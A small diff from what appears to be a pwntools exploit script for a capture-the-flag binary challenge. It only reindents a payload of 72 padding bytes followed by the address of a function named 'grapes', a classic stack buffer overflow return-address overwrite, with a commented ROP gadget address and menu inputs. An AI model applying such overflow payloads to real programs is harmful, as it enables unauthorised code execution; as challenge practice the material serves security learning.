@@ -201,9 +201,9 @@ padding = 72 * b'a'
 # pop_rdi = 0x400c63
 
 payload = flat(
-			padding,
-			elf.symbols.grapes
-				)
+          padding,
+          elf.symbols.grapes
+              )
 
 p.sendlineafter(b'>> ', b'2')
 p.sendlineafter(b'>> ', b'2')
